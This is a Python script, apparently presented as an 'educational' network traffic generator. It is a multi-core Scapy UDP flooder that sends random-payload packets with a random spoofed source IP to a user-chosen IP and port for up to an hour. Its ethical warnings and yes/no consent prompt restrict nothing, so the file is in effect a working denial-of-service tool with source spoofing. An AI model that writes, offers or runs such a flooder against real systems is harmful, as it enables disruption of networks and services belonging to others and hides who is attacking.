import time
import random
import socket
from scapy.all import *
from multiprocessing import Pool, cpu_count
import json
import threading
from colorama import Fore, Style, init

# Initialize Colorama
init(autoreset=True)

class TrafficGenerator:
    def __init__(self):
        self.running = False
        self.test_id = int(time.time())
        self.spoofed_ips = set()
        self.metrics = {
            "total_packets": 0,
            "total_bytes": 0,
            "spoofed_ips_used": 0,
            "start_time": None,
            "end_time": None
        }

        # Get user input with validation
        self.target_ip = self._get_valid_ip()
        self.target_port = self._get_valid_port()
        self.test_duration = self._get_valid_duration()
        self.spoof_interval = self._get_valid_spoof_interval()
        self.min_packet_size, self.max_packet_size = self._get_valid_packet_sizes()

    def _get_valid_ip(self):
        """Validate IP address format"""
        while True:
            ip = input(Fore.BLUE + "Enter target IP address: " + Fore.MAGENTA)
            try:
                socket.inet_aton(ip)
                return ip
            except socket.error:
                print(Fore.RED + "Invalid IP address format. Please try again.")

    def _get_valid_port(self):
        """Validate port number (1-65535)"""
        while True:
            try:
                port = int(input(Fore.BLUE + "Enter target port (1-65535): " + Fore.MAGENTA))
                if 1 <= port <= 65535:
                    return port
                print(Fore.RED + "Port must be between 1 and 65535")
            except ValueError:
                print(Fore.RED + "Invalid input. Please enter a number.")

    def _get_valid_duration(self):
        """Validate test duration (1-3600 seconds)"""
        while True:
            try:
                duration = int(input(Fore.BLUE + "Enter test duration (1-3600 seconds): " + Fore.MAGENTA))
                if 1 <= duration <= 3600:
                    return duration
                print(Fore.RED + "Duration must be between 1 and 3600 seconds")
            except ValueError:
                print(Fore.RED + "Invalid input. Please enter a number.")

    def _get_valid_spoof_interval(self):
        """Validate spoof interval (1-60 seconds)"""
        while True:
            try:
                interval = int(input(Fore.BLUE + "Enter IP spoof interval (1-60 seconds): " + Fore.MAGENTA))
                if 1 <= interval <= 60:
                    return interval
                print(Fore.RED + "Interval must be between 1 and 60 seconds")
            except ValueError:
                print(Fore.RED + "Invalid input. Please enter a number.")

    def _get_valid_packet_sizes(self):
        """Validate packet size range (64-65500 bytes)"""
        while True:
            try:
                min_size = int(input(Fore.BLUE + "Enter minimum packet size (64-65500 bytes): " + Fore.MAGENTA))
                max_size = int(input(Fore.BLUE + "Enter maximum packet size (64-65500 bytes): " + Fore.MAGENTA))
                
                if 64 <= min_size <= max_size <= 65500:
                    return min_size, max_size
                print(Fore.RED + "Invalid range. Minimum must be ≤ Maximum (64-65500)")
            except ValueError:
                print(Fore.RED + "Invalid input. Please enter numbers.")

    def _generate_packet(self):
        """Create realistic-looking UDP traffic"""
        ip_layer = IP(
            src=RandIP(),  # Random source IP
            dst=self.target_ip,
            ttl=random.choice([64, 128, 255]),  # Realistic TTL values
            id=random.randint(1000, 65535)
        )
        
        udp_layer = UDP(
            sport=random.randint(1024, 65535),  # Ephemeral port range
            dport=self.target_port
        )
        
        # Generate payload with realistic patterns
        payload_size = random.randint(self.min_packet_size, self.max_packet_size)
        payload = bytes([random.randint(0, 255) for _ in range(payload_size)])
        
        return ip_layer / udp_layer / Raw(load=payload)

    def _send_packets(self, count=100):
        """Send batch of packets using Scapy"""
        send([self._generate_packet() for _ in range(count)], verbose=0)
        self.metrics["total_packets"] += count
        self.metrics["total_bytes"] += count * (self.min_packet_size + self.max_packet_size) // 2

    def _spoof_rotation(self):
        """Rotate IP spoofing pool periodically"""
        while self.running:
            time.sleep(self.spoof_interval)
            new_ip = RandIP()
            self.spoofed_ips.add(new_ip)
            self.metrics["spoofed_ips_used"] += 1

    def _save_report(self):
        """Generate JSON test report"""
        report = {
            "test_id": self.test_id,
            "target": f"{self.target_ip}:{self.target_port}",
            "duration_sec": self.test_duration,
            "spoof_interval": self.spoof_interval,
            "packet_size_range": f"{self.min_packet_size}-{self.max_packet_size}",
            "metrics": self.metrics,
            "spoofed_ips": list(self.spoofed_ips)[:100]  # Sample first 100 IPs
        }
        with open(f"test_report_{self.test_id}.json", "w") as f:
            json.dump(report, f, indent=2)

    def start_test(self):
        """Run authorized load test"""
        if not self._verify_permissions():
            return

        print(Fore.YELLOW + "\n[!] Starting authorized educational test")
        print(Fore.CYAN + f"• Target: {self.target_ip}:{self.target_port}")
        print(Fore.CYAN + f"• Duration: {self.test_duration}s")
        print(Fore.CYAN + f"• Packet Size: {self.min_packet_size}-{self.max_packet_size} bytes")
        print(Fore.CYAN + f"• Spoof Interval: {self.spoof_interval}s")
        print(Fore.CYAN + f"• Cores used: {cpu_count()}\n")

        self.running = True
        self.metrics["start_time"] = time.time()
        
        # Start IP rotation thread
        spoof_thread = threading.Thread(target=self._spoof_rotation)
        spoof_thread.start()

        # Multi-core packet generation
        with Pool(cpu_count()) as pool:
            try:
                end_time = time.time() + self.test_duration
                while time.time() < end_time:
                    pool.apply_async(self._send_packets, (100,))
                self.running = False
                spoof_thread.join()
                
            except KeyboardInterrupt:
                print(Fore.RED + "\n[!] Test aborted by user")
                self.running = False

        self.metrics["end_time"] = time.time()
        self._save_report()
        print(Fore.GREEN + f"\n[+] Test complete. Report saved to test_report_{self.test_id}.json")

    def _verify_permissions(self):
        """Ethical requirement check"""
        print(Fore.RED + "\nETHICAL REQUIREMENTS:")
        print("1. Written authorization from network owner")
        print("2. Isolated testing environment")
        print("3. No production services impacted")
        print("4. Proper network containment measures\n")
        
        consent = input(Fore.WHITE + "[?] Confirm all requirements are met (yes/no): ").lower()
        if consent != "yes":
            print(Fore.RED + "[!] Test aborted - ethical requirements not met")
            return False
        return True

if __name__ == "__main__":
    print(Fore.MAGENTA + Style.BRIGHT + "\nNetwork Traffic Generator - Educational Tool")
    print(Fore.BLUE + "This tool must only be used with explicit written authorization")
    print(Fore.RED + "Unauthorized use is illegal and unethical\n")
    
    generator = TrafficGenerator()
    generator.start_test()
